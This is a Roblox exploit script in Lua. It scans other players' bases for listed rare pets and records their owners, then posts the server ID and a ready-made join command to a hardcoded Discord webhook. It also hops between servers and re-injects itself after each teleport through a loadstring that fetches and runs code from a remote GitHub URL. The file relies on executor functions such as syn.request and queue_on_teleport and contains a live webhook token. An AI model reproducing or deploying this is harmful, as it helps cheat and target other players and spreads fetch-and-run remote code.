--// CONFIGURATION
local pingModels = {
    ["La Vacca Saturno Saturnita"] = true,
    ["Graipuss Medussi"] = true,
    ["La Grande Combinasion"] = true,
    ["Los Tralaleritos"] = true,
    ["Statutino Libertino"] = true,
    ["Chimpanzini Spiderini"] = true,
    ["Las Tralaleritas"] = true,
    ["Las Vaquitas Saturnitas"] = true,
}
local webhookURL = "https://discord.com/api/webhooks/1398765862835458110/yPDUCwGfwrDAkV9y1LwKDbawWTUWLE6810Y2Dh732FnKG1UiIgLnsMrSAJ3-opRkAAHu"

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local workspace = game:GetService("Workspace")
local Plots = workspace:WaitForChild("Plots")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")

--// VARIABLES
local running, teleporting = true, false

--// Get your own plot to ignore
local myPlotName
for _, plot in ipairs(Plots:GetChildren()) do
    local yourBase = plot:FindFirstChild("YourBase", true)
    if yourBase and yourBase:IsA("BoolValue") and yourBase.Value then
        myPlotName = plot.Name
        break
    end
end

--// Get plot owner from sign
local function getOwner(plot)
    local text = plot:FindFirstChild("PlotSign") and 
        plot.PlotSign:FindFirstChild("SurfaceGui") and 
        plot.PlotSign.SurfaceGui.Frame.TextLabel.Text or "Unknown"
    return text:match("^(.-)'s Base") or text
end

--// Pet scanning
local function scanPets()
    local counts = {}
    for _, plot in ipairs(Plots:GetChildren()) do
        if plot.Name ~= myPlotName then
            local owner = getOwner(plot)
            for _, desc in ipairs(plot:GetDescendants()) do
                if desc.Name == "DisplayName" and desc:IsA("TextLabel") then
                    local petName = desc.Text
                    if pingModels[petName] then
                        local parent = desc.Parent
                        local mutationLabel = parent:FindFirstChild("Mutation")
                        local mutation = (mutationLabel and mutationLabel:IsA("TextLabel")) and mutationLabel.Text or "None"

                        counts[owner] = counts[owner] or {}
                        local key = petName .. (mutation ~= "None" and (" (" .. mutation .. ")") or "")
                        counts[owner][key] = (counts[owner][key] or 0) + 1
                    end
                end
            end
        end
    end

    -- Print results
    if next(counts) then
        print("=== Pet Finder Results ===")
        for owner, pets in pairs(counts) do
            for name, count in pairs(pets) do
                print(name .. " x" .. count .. " | Owner: " .. owner)
            end
        end
        print("==========================")
    else
        print("No rare pets found.")
    end
end

--// Model scanning
local function scanModels()
    local found = {}
    for name in pairs(pingModels) do
        local obj = workspace:FindFirstChild(name)
        if obj then
            print("[FOUND MODEL]", name)
            table.insert(found, name)
        else
            print("[MISSING MODEL]", name)
        end
    end
    return found
end

--// Send webhook
local function sendWebhook(foundModels)
    local req = (syn and syn.request) or http_request or (fluxus and fluxus.request)
    if not req then warn("No HTTP request function found."); return end

    local msg = "@everyone\n✅ Script injected. JobId: `" .. game.JobId .. "`"

    if #foundModels > 0 then
        msg ..= "\nFound models:\n- " .. table.concat(foundModels, "\n- ")
    else
        msg ..= "\nNo models found."
    end

    msg ..= "\n\nJoin: `game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ', "' .. game.JobId .. '")`'

    pcall(function()
        req({
            Url = webhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = msg})
        })
    end)

    if #foundModels > 0 then
        print("[HALT] Rare model found. Stopping auto-hop.")
        running = false
    end
end

--// Server hopping
local function getOnePlayerServers()
    local ok, res = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
    end)
    if not ok then return {} end

    local list = {}
    for _, server in ipairs(res.data) do
        if server.id ~= game.JobId then
            table.insert(list, server.id)
        end
    end
    return list
end

local function tryTeleport(serverId)
    if teleporting then return end
    teleporting = true
    local success, err = pcall(function()
        TeleportService:TeleportToPlaceInstance(game.PlaceId, serverId, LocalPlayer)
    end)
    teleporting = false
    if not success then warn("[Teleport Error]", err) end
    return success
end

--// Combined loop
local function hopLoop()
    while running do
        scanPets()
        task.wait(5) -- Wait after pet scan before scanning models

        local found = scanModels()
        sendWebhook(found)

        if not running then break end
        task.wait(1)

        local servers = getOnePlayerServers()
        if #servers >= 1 then
            local serverId = servers[math.random(1, #servers)]
            if tryTeleport(serverId) then
                print("[HOP] Teleporting to", serverId)
                break
            else
                task.wait(1)
            end
        else
            task.wait(1)
        end
    end
end

--// Teleport failure fallback
TeleportService.TeleportInitFailed:Connect(function()
    print("[Teleport Failed] Rejoining current server...")
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
end)

--// Manual toggle with Q
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.Q then
        running = not running
        print(running and "[RESUMED]" or "[PAUSED]")
        if running then coroutine.wrap(hopLoop)() end
    end
end)

--// Start hopping
coroutine.wrap(hopLoop)()

--// Re-inject on teleport
local scriptURL = "https://raw.githubusercontent.com/bypassv5/SabChecker/refs/heads/main/script.lua"
if queue_on_teleport then
    queue_on_teleport("loadstring(game:HttpGet('"..scriptURL.."'))()")
end
